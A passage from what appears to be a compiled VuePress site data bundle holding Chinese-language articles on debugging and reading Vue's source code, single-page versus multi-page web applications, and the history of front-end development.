同一内容的图片只允许有一张",charsets:{cjk:!0}},{title:"VUE源码的简单分析",frontmatter:{},regularPath:"/vue/Vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/01-%E5%88%86%E6%9E%90%E5%87%86%E5%A4%87.html",relativePath:"vue/Vue源码分析/01-分析准备.md",key:"v-93415808",path:"/vue/Vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/01-%E5%88%86%E6%9E%90%E5%87%86%E5%A4%87.html",headers:[{level:2,title:"调试",slug:"调试",normalizedTitle:"调试",charIndex:17},{level:3,title:"source map",slug:"source-map",normalizedTitle:"source map",charIndex:24},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:238},{level:3,title:"目录结构",slug:"目录结构",normalizedTitle:"目录结构",charIndex:259}],headersStr:"调试 source map 启动 目录结构",content:'# VUE源码的简单分析\n\n\n# 调试\n\n\n# source map\n\n> 在 package.json -> scripts 中的 dev 命令中添加 --sourcemap，这样就可以在浏览器中调试源码时查看当前代码在源码中的位置。\n\n{\n  "scripts": {\n    "dev": "rollup -w -c scripts/config.js --sourcemap --environment TARGET:web-full-dev"\n  }\n}\n\n\n\n# 启动\n\nnpm run dev\n\n\n\n# 目录结构\n\n├── benchmarks                  性能、基准测试\n├── dist                        构建打包的输出目录\n├── examples                    案例目录\n├── flow                        flow 语法的类型声明\n├── packages                    一些额外的包，比如：负责服务端渲染的包 vue-server-renderer、配合 vue-loader 使用的的 vue-template-compiler，还有 weex 相关的\n│   ├── vue-server-renderer\n│   ├── vue-template-compiler\n│   ├── weex-template-compiler\n│   └── weex-vue-framework\n├── scripts                     所有的配置文件的存放位置，比如 rollup 的配置文件\n├── src                         vue 源码目录\n│   ├── compiler                编译器\n│   ├── core                    运行时的核心包\n│   │   ├── components          全局组件，比如 keep-alive\n│   │   ├── config.js           一些默认配置项\n│   │   ├── global-api          全局 API，比如熟悉的：Vue.use()、Vue.component() 等\n│   │   ├── instance            Vue 实例相关的，比如 Vue 构造函数就在这个目录下\n│   │   ├── observer            响应式原理\n│   │   ├── util                工具方法\n│   │   └── vdom                虚拟 DOM 相关，比如熟悉的 patch 算法就在这儿\n│   ├── platforms               平台相关的编译器代码\n│   │   ├── web\n│   │   └── weex\n│   ├── server                  服务端渲染相关\n├── test                        测试目录\n├── types                       TS 类型声明\n',normalizedContent:'# vue源码的简单分析\n\n\n# 调试\n\n\n# source map\n\n> 在 package.json -> scripts 中的 dev 命令中添加 --sourcemap，这样就可以在浏览器中调试源码时查看当前代码在源码中的位置。\n\n{\n  "scripts": {\n    "dev": "rollup -w -c scripts/config.js --sourcemap --environment target:web-full-dev"\n  }\n}\n\n\n\n# 启动\n\nnpm run dev\n\n\n\n# 目录结构\n\n├── benchmarks                  性能、基准测试\n├── dist                        构建打包的输出目录\n├── examples                    案例目录\n├── flow                        flow 语法的类型声明\n├── packages                    一些额外的包，比如：负责服务端渲染的包 vue-server-renderer、配合 vue-loader 使用的的 vue-template-compiler，还有 weex 相关的\n│   ├── vue-server-renderer\n│   ├── vue-template-compiler\n│   ├── weex-template-compiler\n│   └── weex-vue-framework\n├── scripts                     所有的配置文件的存放位置，比如 rollup 的配置文件\n├── src                         vue 源码目录\n│   ├── compiler                编译器\n│   ├── core                    运行时的核心包\n│   │   ├── components          全局组件，比如 keep-alive\n│   │   ├── config.js           一些默认配置项\n│   │   ├── global-api          全局 api，比如熟悉的：vue.use()、vue.component() 等\n│   │   ├── instance            vue 实例相关的，比如 vue 构造函数就在这个目录下\n│   │   ├── observer            响应式原理\n│   │   ├── util                工具方法\n│   │   └── vdom                虚拟 dom 相关，比如熟悉的 patch 算法就在这儿\n│   ├── platforms               平台相关的编译器代码\n│   │   ├── web\n│   │   └── weex\n│   ├── server                  服务端渲染相关\n├── test                        测试目录\n├── types                       ts 类型声明\n',charsets:{cjk:!0}},{title:"Vue 初始化过程",frontmatter:{},regularPath:"/vue/Vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/02-%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B.html",relativePath:"vue/Vue源码分析/02-初始化过程.md",key:"v-630b9f2b",path:"/vue/Vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/02-%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B.html",headers:[{level:2,title:"入口",slug:"入口",normalizedTitle:"入口",charIndex:16},{level:2,title:"初始化",slug:"初始化",normalizedTitle:"初始化",charIndex:6}],headersStr:"入口 初始化",content:"# Vue 初始化过程\n\n\n# 入口\n\n> 在 /examples 目录下增加一个示例文件 demo/index.html，在文件中添加如下内容：\n\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"utf-8\">\n    <title>Vue.js tree view example</title>\n    \x3c!-- Delete \".min\" for console warnings in development --\x3e\n</head>\n\n<body>\n    <div id='demo'>\n        {{msg}}\n    </div>\n</body>\n\n</html>\n<script src=\"../../dist/vue.js\"><\/script>\n<script>\n    console.log(Vue)\n    const demo = new Vue({\n        el: '#demo',\n        data() {\n            return {\n                msg: '1'\n            }\n        },\n    })\n<\/script>\n\n\n\n# 初始化\n\n> /src/core/instance/index.js\n\nimport { initMixin } from './init'\nimport { stateMixin } from './state'\nimport { renderMixin } from './render'\nimport { eventsMixin } from './events'\nimport { lifecycleMixin } from './lifecycle'\nimport { warn } from '../util/index'\n\n// Vue 构造函数\nfunction Vue (options) {\n// 这里判断如果不是生产环境的话输入警告\n  if (process.env.NODE_ENV !== 'production' &&\n    !(this instanceof Vue)\n  ) {\n    warn('Vue is a constructor and should be called with the `new` keyword')\n  }\n  // 调用 Vue.prototype._init 方法，该方法是在 initMixin 中定义的\n  this._init(options)\n}\n\n// 定义 Vue.prototype._init 方法\ninitMixin(Vue)\nstateMixin(Vue)\neventsMixin(Vue)\nlifecycleMixin(Vue)\nrenderMixin(Vue)\n\nexport default Vue\n",normalizedContent:"# vue 初始化过程\n\n\n# 入口\n\n> 在 /examples 目录下增加一个示例文件 demo/index.html，在文件中添加如下内容：\n\n<!doctype html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"utf-8\">\n    <title>vue.js tree view example</title>\n    \x3c!-- delete \".min\" for console warnings in development --\x3e\n</head>\n\n<body>\n    <div id='demo'>\n        {{msg}}\n    </div>\n</body>\n\n</html>\n<script src=\"../../dist/vue.js\"><\/script>\n<script>\n    console.log(vue)\n    const demo = new vue({\n        el: '#demo',\n        data() {\n            return {\n                msg: '1'\n            }\n        },\n    })\n<\/script>\n\n\n\n# 初始化\n\n> /src/core/instance/index.js\n\nimport { initmixin } from './init'\nimport { statemixin } from './state'\nimport { rendermixin } from './render'\nimport { eventsmixin } from './events'\nimport { lifecyclemixin } from './lifecycle'\nimport { warn } from '../util/index'\n\n// vue 构造函数\nfunction vue (options) {\n// 这里判断如果不是生产环境的话输入警告\n  if (process.env.node_env !== 'production' &&\n    !(this instanceof vue)\n  ) {\n    warn('vue is a constructor and should be called with the `new` keyword')\n  }\n  // 调用 vue.prototype._init 方法，该方法是在 initmixin 中定义的\n  this._init(options)\n}\n\n// 定义 vue.prototype._init 方法\ninitmixin(vue)\nstatemixin(vue)\neventsmixin(vue)\nlifecyclemixin(vue)\nrendermixin(vue)\n\nexport default vue\n",charsets:{cjk:!0}},{title:"Web开发架构的变迁",frontmatter:{},regularPath:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84%E7%9A%84%E5%8F%98%E8%BF%81.html",relativePath:"vue/组件化思想/开发架构的变迁.md",key:"v-0d83810e",path:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84%E7%9A%84%E5%8F%98%E8%BF%81.html",headers:[{level:2,title:"前端开发架构",slug:"前端开发架构",normalizedTitle:"前端开发架构",charIndex:17},{level:3,title:"传统的架构",slug:"传统的架构",normalizedTitle:"传统的架构",charIndex:244},{level:3,title:"单页应用的架构",slug:"单页应用的架构",normalizedTitle:"单页应用的架构",charIndex:254},{level:2,title:"多页应用(MPA,Multi-Page Application)",slug:"多页应用-mpa-multi-page-application",normalizedTitle:"多页应用(mpa,multi-page application)",charIndex:266},{level:2,title:"单页应用(SPA,Single-Page Application)",slug:"单页应用-spa-single-page-application",normalizedTitle:"单页应用(spa,single-page application)",charIndex:494},{level:2,title:"多页应用与单页应用优缺点",slug:"多页应用与单页应用优缺点",normalizedTitle:"多页应用与单页应用优缺点",charIndex:761},{level:3,title:"多页应用",slug:"多页应用",normalizedTitle:"多页应用",charIndex:266},{level:3,title:"单页应用",slug:"单页应用",normalizedTitle:"单页应用",charIndex:254},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:1100}],headersStr:"前端开发架构 传统的架构 单页应用的架构 多页应用(MPA,Multi-Page Application) 单页应用(SPA,Single-Page Application) 多页应用与单页应用优缺点 多页应用 单页应用 总结",content:"# Web开发架构的变迁\n\n\n# 前端开发架构\n\n现在的 Web 应用程序除了外观比过去更好看以外，应用程序的架构和创建方式已经和过去有很大的不同。为突出这点，我们来看看如下的应用：\n\n这是一个简单的商品目录浏览应用程序，它和这种类型的其它应用程序一样，通常包含一个主页、一个搜索结果页、一个详情页等等。\n\n前端可以做到：读写数据、切换视图、用户交互，这意味着，网页其实是一个应用程序。\n\n2010年后，前端工程师从开发页面，变成了开发“前端应用”（跑在浏览器里面的应用程序）。\n\n\n# 传统的架构\n\n\n# 单页应用的架构\n\n\n# 多页应用(MPA,Multi-Page Application)\n\n如果你几年前做过这种应用程序，可能会采用包含多个单页面的方式。页面流可能会像下面这样：\n\n在多页设计方式下，对于大多数改变页面显示的行为，Web 应用会导航到一个完全不同的页面。用户会看到原页面被销毁，然后出来一个新页面，这种用户体验很不尽人意。这对如何维护应用程序的状态有很大影响。除了通过 cookie 和一些服务端机制来保存用户数据外，基本上就不用管别的了。生活是美好的。\n\n\n# 单页应用(SPA,Single-Page Application)\n\n现代的应用程序趋向于采用单页应用（SPA）模式。这种模式下，我们不需要导航到不同的页面，甚至不需要重新加载一个页面。应用的不同视图被加载和卸载到同一页面上。\n\n在单页应用模式下，应用看起来应该是这样子：\n\n当用户与应用程序交互时，我们用匹配用户行为的数据和 HTML 替换红色虚线区域的内容，从而带来更流式的体验。我们甚至可以用很多视觉技术让新内容很好地过渡，而这种很酷的技术以前只在移动设备或者桌面应用中才有。这类效果在多个页面中导航时几乎是不可能的。\n\n\n# 多页应用与单页应用优缺点\n\n\n# 多页应用\n\n每一次页面跳转的时候，后台服务器都会返回一个新的html文档，这种类型的网站也就是多页网站，也叫多页应用。\n\n * 页面跳转： 返回HTML\n * 优点： 首屏时间快，SEO效果好\n * 缺点： 页面切换慢\n\n\n# 单页应用\n\n第一次进入页面时会请求一个html文件，刷新清除一下，切换到其他组件，此时路径也相应变化，但是并没有新的html文件请求，页面内容却变化了。\n\n * 页面跳转：js渲染\n * 优点：页面切换快\n * 缺点：首屏时间稍慢，SEO差\n\nSEO效果差，因为搜索引擎只认识html里的内容，不认识js渲染生成的内容，搜索引擎不识别，也就不会给一个好排名，会导致单页应用做出来的网页在搜索引擎上的排名差。\n\n\n# 总结\n\n/               多页面应用模式MPA                                    单页面应用模式SPA\n应用构成            由多个完整页面构成                                     一个外壳页面和多个页面片段构成\n跳转方式            页面之间的跳转是从一个页面到另一个页面                           一个页面片段删除或隐藏，加载另一个页面片段并显示。片段间的模拟跳转，没有开壳页面\n跳转后公共资源是否重新加载   是                                             否\nURL模式           http://xxx/page1.html和http://xxx/page2.html   http://xxx/shell.html#page1和http://xxx/shell.html#page2\n用户体验            页面间切换加载慢，不流畅，用户体验差，尤其在移动端                     页面片段间切换快，用户体验好，包括移动设备\n能否实现转场动画        否                                             容易实现（手机APP动效）\n页面间传递数据         依赖URL、cookie或者localstorage，实现麻烦               页面传递数据容易（Vuex或Vue中的父子组件通讯props对象）\n搜索引擎优化（SEO）     可以直接做                                         需要单独方案（SSR）\n特别适用的范围         需要对搜索引擎友好的网站                                  对体验要求高，特别是移动应用\n开发难度            较低，框架选择容易                                     较高，需要专门的框架来降低这种模式的开发难度",normalizedContent:"# web开发架构的变迁\n\n\n# 前端开发架构\n\n现在的 web 应用程序除了外观比过去更好看以外，应用程序的架构和创建方式已经和过去有很大的不同。为突出这点，我们来看看如下的应用：\n\n这是一个简单的商品目录浏览应用程序，它和这种类型的其它应用程序一样，通常包含一个主页、一个搜索结果页、一个详情页等等。\n\n前端可以做到：读写数据、切换视图、用户交互，这意味着，网页其实是一个应用程序。\n\n2010年后，前端工程师从开发页面，变成了开发“前端应用”（跑在浏览器里面的应用程序）。\n\n\n# 传统的架构\n\n\n# 单页应用的架构\n\n\n# 多页应用(mpa,multi-page application)\n\n如果你几年前做过这种应用程序，可能会采用包含多个单页面的方式。页面流可能会像下面这样：\n\n在多页设计方式下，对于大多数改变页面显示的行为，web 应用会导航到一个完全不同的页面。用户会看到原页面被销毁，然后出来一个新页面，这种用户体验很不尽人意。这对如何维护应用程序的状态有很大影响。除了通过 cookie 和一些服务端机制来保存用户数据外，基本上就不用管别的了。生活是美好的。\n\n\n# 单页应用(spa,single-page application)\n\n现代的应用程序趋向于采用单页应用（spa）模式。这种模式下，我们不需要导航到不同的页面，甚至不需要重新加载一个页面。应用的不同视图被加载和卸载到同一页面上。\n\n在单页应用模式下，应用看起来应该是这样子：\n\n当用户与应用程序交互时，我们用匹配用户行为的数据和 html 替换红色虚线区域的内容，从而带来更流式的体验。我们甚至可以用很多视觉技术让新内容很好地过渡，而这种很酷的技术以前只在移动设备或者桌面应用中才有。这类效果在多个页面中导航时几乎是不可能的。\n\n\n# 多页应用与单页应用优缺点\n\n\n# 多页应用\n\n每一次页面跳转的时候，后台服务器都会返回一个新的html文档，这种类型的网站也就是多页网站，也叫多页应用。\n\n * 页面跳转： 返回html\n * 优点： 首屏时间快，seo效果好\n * 缺点： 页面切换慢\n\n\n# 单页应用\n\n第一次进入页面时会请求一个html文件，刷新清除一下，切换到其他组件，此时路径也相应变化，但是并没有新的html文件请求，页面内容却变化了。\n\n * 页面跳转：js渲染\n * 优点：页面切换快\n * 缺点：首屏时间稍慢，seo差\n\nseo效果差，因为搜索引擎只认识html里的内容，不认识js渲染生成的内容，搜索引擎不识别，也就不会给一个好排名，会导致单页应用做出来的网页在搜索引擎上的排名差。\n\n\n# 总结\n\n/               多页面应用模式mpa                                    单页面应用模式spa\n应用构成            由多个完整页面构成                                     一个外壳页面和多个页面片段构成\n跳转方式            页面之间的跳转是从一个页面到另一个页面                           一个页面片段删除或隐藏，加载另一个页面片段并显示。片段间的模拟跳转，没有开壳页面\n跳转后公共资源是否重新加载   是                                             否\nurl模式           http://xxx/page1.html和http://xxx/page2.html   http://xxx/shell.html#page1和http://xxx/shell.html#page2\n用户体验            页面间切换加载慢，不流畅，用户体验差，尤其在移动端                     页面片段间切换快，用户体验好，包括移动设备\n能否实现转场动画        否                                             容易实现（手机app动效）\n页面间传递数据         依赖url、cookie或者localstorage，实现麻烦               页面传递数据容易（vuex或vue中的父子组件通讯props对象）\n搜索引擎优化（seo）     可以直接做                                         需要单独方案（ssr）\n特别适用的范围         需要对搜索引擎友好的网站                                  对体验要求高，特别是移动应用\n开发难度            较低，框架选择容易                                     较高，需要专门的框架来降低这种模式的开发难度",charsets:{cjk:!0}},{title:"以史为鉴：前端开发的四个时代",frontmatter:{},regularPath:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%97%B6%E4%BB%A3.html",relativePath:"vue/组件化思想/前端开发的四个时代.md",key:"v-7e0cfcf8",path:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%97%B6%E4%BB%A3.html",headers:[{level:2,title:"四个时代",slug:"四个时代",normalizedTitle:"四个时代",charIndex:12},{level:3,title:"黑铁时代 - 插件化",slug:"黑铁时代-插件化",normalizedTitle:"黑铁时代 - 插件化",charIndex:292},{level:3,title:"青铜时代 - 模块化",slug:"青铜时代-模块化",normalizedTitle:"青铜时代 - 模块化",charIndex:718},{level:3,title:"白银时代 - 组件化",slug:"白银时代-组件化",normalizedTitle:"白银时代 - 组件化",charIndex:1157},{level:3,title:"黄金时代 - 专业化",slug:"黄金时代-专业化",normalizedTitle:"黄金时代 - 专业化",charIndex:1894}],headersStr:"四个时代 黑铁时代 - 插件化 青铜时代 - 模块化 白银时代 - 组件化 黄金时代 - 专业化",content:"# 以史为鉴：前端开发的四个时代\n\n在前端整体进入组件化开发时代后，手写各种 UI 组件成为了许多前端工程师入门后的第一课。而对于工作了几年的资深工程师来说，手写组件已经不再是问题，但对于如何帮助团队提升整体开发效率以及个人接下来的技术成长方向却开始变得非常迷茫。\n\n> 以铜为鉴，可以正衣冠；以人为鉴，可以明得失；以史为鉴，可以知兴替。\n\n想要摆脱对未来的迷茫，最好的方法就是向后看，看一路走来前端开发是如何从服务端主导的静态网站一步步发展到现在由客户端主导的单页应用。只有了解了过去前端分别在不同的阶段解决了怎样的问题，才能更好地看清楚未来要向哪里去。\n\n\n# 四个时代\n\n\n# 黑铁时代 - 插件化\n\n在前端界大名鼎鼎的 jQuery 诞生于 2006 年，那时还没有 Google Chrome，微软刚刚发布了直到现在还在令许多前端开发者头疼的 IE 7。\n\njQuery 作为试图抹平不同浏览器之间 API 差异的先锋进入了人们的视野，并在之后很长的一段时间内占据了 Web 开发领域统治性的地位。那时开发一个网站并不需要先配置一个复杂的脚手架，只需要新建一个 HTML 文件即可，开发者们也远未意识到未来前端开发究竟会复杂到什么样的程度，以页面为单位的开发方式在当时看起来并没有什么问题。\n\n那时还没有人提出组件的概念，基于 jQuery 的 UI 组件都被称为 jQuery 插件（plugin），代表着在任何浏览器环境下都可以即插即用。\n\n项目的开发速度完全取决于页面数量的多少及布局的复杂程度，所有的变量都挂载在全局之下，引用的各个插件之间相互独立，这样的开发方式似乎并没有给开发者们留下多少可以优化的空间。\n\n\n# 青铜时代 - 模块化\n\n随着 Ajax 等技术的普及，客户端 JavaScript 的代码量也越来越大，开发者们开始无法忍受全局变量带来的命名冲突，各个插件之间虽然相互独立但多个插件之间的依赖关系却也变得越来越复杂。这时前端开发对于模块化的需求变得非常强烈，于是便涌现出了 RequireJS 和 Sea.js 两大专注于解决前端模块化问题的类库，以 Sea.js 发布 1.0 正式版的时间为参考，那时是 2011 年 7 月。\n\n解决了命名空间和文件依赖的问题，前端终于可以轻装上阵。配合着日趋成熟的各种 UI 插件库，这时前端项目的开发速度有了第一次质的提升。\n\n摆脱了全局变量的限制，越来越多的前端插件被沉淀了下来。页面数量虽然依然被作为衡量开发量的一个重要指标，但在开发流程中各个模块之间已经开始了协作，开发一个新页面的工作量也不再完全等于页面本身。与此同时，npm 的出现也让这些沉淀下来的前端插件有了栖身之处，却也为今天前端类库小而分散的现状埋下了隐患。\n\n\n# 白银时代 - 组件化\n\n在前端模块化进行得如火如荼的同时，由谷歌开发的 AngularJS 也于 2010 年 10 月发布，这是第一次 JavaScript 框架试图接管所有的 DOM 操作。不过由于在当时过于超前的设计和后续断崖式的升级，AngularJS 一直没能打破 jQuery 在前端开发界的统治地位，直到 2013 年 Facebook 发布 React。\n\n专注于 View 层的 React 虽然提出了 JSX 这样不符合传统前端开发习惯的新概念，但基于虚拟 DOM 的重绘效率确实要比 AngularJS 的脏检查高出一个数量级。这着实吸引了许多前端开发者的目光，也让前端开发真正进入了组件化时代。\n\n摆脱了 DOM 的限制，组件与组件之间的数据传递第一次变得如此轻松，这让开发功能强大的大型复杂组件及沉淀能够覆盖大部分底层需求的 UI 组件库变为了可能。\n\n过去的几年中，以 ant-design、material-ui 等为代表的优秀的开源前端组件库如雨后春笋般冒了出来，MVVM 框架配合其生态内的组件库成为了现代前端开发的标配。与此同时，前端工程化的浪潮也汹涌袭来，以 Babel、webpack 和 TypeScript 等为代表的 JavaScript 增强工具帮助 JavaScript 摆脱了脚本语言的定位，JavaScript 也开始成为编写大型工程项目的可选项。\n\n但这时开发者们突然发现，以前只需要打开 Notepad++ 就可以轻松写前端的日子不在了，开始一个前端项目变得异常复杂。在组件库的帮助下，虽然项目的复杂度被大幅降低了，但花在写代码上的时间却一点也没有减少，用组件拼出一个个页面的世界似乎并没有想象中那么美好。\n\n\n# 黄金时代 - 专业化\n\n时间来到 2017 年，作为前端组件库界标杆的 ant-design 先后发布了 ant-design-mobile 及 ant-design-pro，淘宝系也发布了飞冰（以下称为 ice）。\n\n其中 ant-design-mobile 是一套专注于移动端混合应用开发的前端组件库，现在又推出了 React Native 的版本。曾经在前端开发界流行过一段时间响应式设计的风潮，即一套代码适配所有终端。但慢慢大家发现，一套代码支持所有终端终究只是一个美丽的梦想，移动端和桌面端之间页面尺寸及操作交互的巨大差异，导致二者都需要更专业的解决方案来应对。\n\nant-design-mobile 想要解决的是移动端的问题，而 ant-design-pro 想要解决的则是企业中后台管理系统搭建这样一个问题。这些被抽象出来后针对中后台系统优化的组件并不能够直接用于搭建前台项目，但牺牲了通用性所换来的专业性也代表着前端在向着细分领域的专业化解决方案靠拢。ice 与 ant-design-pro 类似，所不同的是 ice 还集成了项目的脚手架部分，致力于实现一套纯 GUI 的前端开发模式。\n\n这里我们先按下这些垂直领域的解决方案是否能够解决相应的问题不表，但我们从这些事例中可以看出的趋势是清晰的：区别于之前大力建设作为前端基础设施的组件库，前端的下一个方向就是要在这些基础设施之上同时向多个细分领域进军，如上面提到的移动端、企业中后台，又如富文本编辑、数据可视化等这些对于专业深度要求更高的领域。",normalizedContent:"# 以史为鉴：前端开发的四个时代\n\n在前端整体进入组件化开发时代后，手写各种 ui 组件成为了许多前端工程师入门后的第一课。而对于工作了几年的资深工程师来说，手写组件已经不再是问题，但对于如何帮助团队提升整体开发效率以及个人接下来的技术成长方向却开始变得非常迷茫。\n\n> 以铜为鉴，可以正衣冠；以人为鉴，可以明得失；以史为鉴，可以知兴替。\n\n想要摆脱对未来的迷茫，最好的方法就是向后看，看一路走来前端开发是如何从服务端主导的静态网站一步步发展到现在由客户端主导的单页应用。只有了解了过去前端分别在不同的阶段解决了怎样的问题，才能更好地看清楚未来要向哪里去。\n\n\n# 四个时代\n\n\n# 黑铁时代 - 插件化\n\n在前端界大名鼎鼎的 jquery 诞生于 2006 年，那时还没有 google chrome，微软刚刚发布了直到现在还在令许多前端开发者头疼的 ie 7。\n\njquery 作为试图抹平不同浏览器之间 api 差异的先锋进入了人们的视野，并在之后很长的一段时间内占据了 web 开发领域统治性的地位。那时开发一个网站并不需要先配置一个复杂的脚手架，只需要新建一个 html 文件即可，开发者们也远未意识到未来前端开发究竟会复杂到什么样的程度，以页面为单位的开发方式在当时看起来并没有什么问题。\n\n那时还没有人提出组件的概念，基于 jquery 的 ui 组件都被称为 jquery 插件（plugin），代表着在任何浏览器环境下都可以即插即用。\n\n项目的开发速度完全取决于页面数量的多少及布局的复杂程度，所有的变量都挂载在全局之下，引用的各个插件之间相互独立，这样的开发方式似乎并没有给开发者们留下多少可以优化的空间。\n\n\n# 青铜时代 - 模块化\n\n随着 ajax 等技术的普及，客户端 javascript 的代码量也越来越大，开发者们开始无法忍受全局变量带来的命名冲突，各个插件之间虽然相互独立但多个插件之间的依赖关系却也变得越来越复杂。这时前端开发对于模块化的需求变得非常强烈，于是便涌现出了 requirejs 和 sea.js 两大专注于解决前端模块化问题的类库，以 sea.js 发布 1.0 正式版的时间为参考，那时是 2011 年 7 月。\n\n解决了命名空间和文件依赖的问题，前端终于可以轻装上阵。配合着日趋成熟的各种 ui 插件库，这时前端项目的开发速度有了第一次质的提升。\n\n摆脱了全局变量的限制，越来越多的前端插件被沉淀了下来。页面数量虽然依然被作为衡量开发量的一个重要指标，但在开发流程中各个模块之间已经开始了协作，开发一个新页面的工作量也不再完全等于页面本身。与此同时，npm 的出现也让这些沉淀下来的前端插件有了栖身之处，却也为今天前端类库小而分散的现状埋下了隐患。\n\n\n# 白银时代 - 组件化\n\n在前端模块化进行得如火如荼的同时，由谷歌开发的 angularjs 也于 2010 年 10 月发布，这是第一次 javascript 框架试图接管所有的 dom 操作。不过由于在当时过于超前的设计和后续断崖式的升级，angularjs 一直没能打破 jquery 在前端开发界的统治地位，直到 2013 年 facebook 发布 react。\n\n专注于 view 层的 react 虽然提出了 jsx 这样不符合传统前端开发习惯的新概念，但基于虚拟 dom 的重绘效率确实要比 angularjs 的脏检查高出一个数量级。这着实吸引了许多前端开发者的目光，也让前端开发真正进入了组件化时代。\n\n摆脱了 dom 的限制，组件与组件之间的数据传递第一次变得如此轻松，这让开发功能强大的大型复杂组件及沉淀能够覆盖大部分底层需求的 ui 组件库变为了可能。\n\n过去的几年中，以 ant-design、material-ui 等为代表的优秀的开源前端组件库如雨后春笋般冒了出来，mvvm 框架配合其生态内的组件库成为了现代前端开发的标配。与此同时，前端工程化的浪潮也汹涌袭来，以 babel、webpack 和 typescript 等为代表的 javascript 增强工具帮助 javascript 摆脱了脚本语言的定位，javascript 也开始成为编写大型工程项目的可选项。\n\n但这时开发者们突然发现，以前只需要打开 notepad++ 就可以轻松写前端的日子不在了，开始一个前端项目变得异常复杂。在组件库的帮助下，虽然项目的复杂度被大幅降低了，但花在写代码上的时间却一点也没有减少，用组件拼出一个个页面的世界似乎并没有想象中那么美好。\n\n\n# 黄金时代 - 专业化\n\n时间来到 2017 年，作为前端组件库界标杆的 ant-design 先后发布了 ant-design-mobile 及 ant-design-pro，淘宝系也发布了飞冰（以下称为 ice）。\n\n其中 ant-design-mobile 是一套专注于移动端混合应用开发的前端组件库，现在又推出了 react native 的版本。曾经在前端开发界流行过一段时间响应式设计的风潮，即一套代码适配所有终端。但慢慢大家发现，一套代码支持所有终端终究只是一个美丽的梦想，移动端和桌面端之间页面尺寸及操作交互的巨大差异，导致二者都需要更专业的解决方案来应对。\n\nant-design-mobile 想要解决的是移动端的问题，而 ant-design-pro 想要解决的则是企业中后台管理系统搭建这样一个问题。这些被抽象出来后针对中后台系统优化的组件并不能够直接用于搭建前台项目，但牺牲了通用性所换来的专业性也代表着前端在向着细分领域的专业化解决方案靠拢。ice 与 ant-design-pro 类似，所不同的是 ice 还集成了项目的脚手架部分，致力于实现一套纯 gui 的前端开发模式。\n\n这里我们先按下这些垂直领域的解决方案是否能够解决相应的问题不表，但我们从这些事例中可以看出的趋势是清晰的：区别于之前大力建设作为前端基础设施的组件库，前端的下一个方向就是要在这些基础设施之上同时向多个细分领域进军，如上面提到的移动端、企业中后台，又如富文本编辑、数据可视化等这些对于专业深度要求更高的领域。",charsets:{cjk:!0}},{title:"Web开发发展史",frontmatter:{},regularPath:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/Web%E5%BC%80%E5%8F%91%E5%8F%91%E5%B1%95%E5%8F%B2.html",relativePath:"vue/组件化思想/Web开发发展史.md",key:"v-36f6dd32",path:"/vue/%E7%BB%84%E4%BB%B6%E5%8C%96%E6%80%9D%E6%83%B3/Web%E5%BC%80%E5%8F%91%E5%8F%91%E5%B1%95%E5%8F%B2.html",headers:[{level:2,title:"静态网页",slug:"静态网页",normalizedTitle:"静态网页",charIndex:218},{level:2,title:"初期动态网页CGI",slug:"初期动态网页cgi",normalizedTitle:"初期动态网页cgi",charIndex:451},{level:2,title:"框架时代MVC/ORM",slug:"框架时代mvc-orm",normalizedTitle:"框架时代mvc/orm",charIndex:1415},{level:3,title:"前后端接口的约定。",slug:"前后端接口的约定。",normalizedTitle:"前后端接口的约定。",charIndex:2708},{level:3,title:"前端开发的复杂度控制。",slug:"前端开发的复杂度控制。",normalizedTitle:"前端开发的复杂度控制。",charIndex:2846},{level:2,title:"前端MVC Angular/Backbone",slug:"前端mvc-angular-backbone",normalizedTitle:"前端mvc angular/backbone",charIndex:2991},{level:2,title:"JavaScript在服务器端的逆袭 Node",slug:"javascript在服务器端的逆袭-node",normalizedTitle:"javascript在服务器端的逆袭 node",charIndex:3288},{level:2,title:"前端组件化时代",slug:"前端组件化时代",normalizedTitle:"前端组件化时代",charIndex:3800},{level:3,title:"Web Components",slug:"web-components",normalizedTitle:"web components",charIndex:4155},{level:2,title:"未来：前端智能化",slug:"未来-前端智能化",normalizedTitle:"未来：前端智能化",charIndex:5057}],headersStr:"静态网页 初期动态网页CGI 框架时代MVC/ORM 前后端接口的约定。 前端开发的复杂度控制。 前端MVC Angular/Backbone JavaScript在服务器端的逆袭 Node 前端组件化时代 Web Components 未来：前端智能化",content:"# Web开发发展史\n\n了解一下Web开发相关的历史，相关技术的演进历程，知其前世今生，非常有助于加深Web开发相关技术的理解和认识。\n\n从静态页面到JavaScript，从依赖后端到自主开发，前端开发者从不被重视的“页面仔”逆袭为如今很多前端工程师的薪资比后端还高，从前端技术由国外开发者主导到如今国内自主产生的小程序技术，我们走了 20 年。\n\n1990 年，第一个Web浏览器诞生，而WWW的诞生直接拉开前端史的序幕。本文从最初的静态网页到CGI、PHP/JSP/ASP、分布式企业计算平台J2EE/.Net、框架时代、Ajax、前端MVC、NodeJS、组件化、智能化的这个过程进行简要的介绍。\n\n\n# 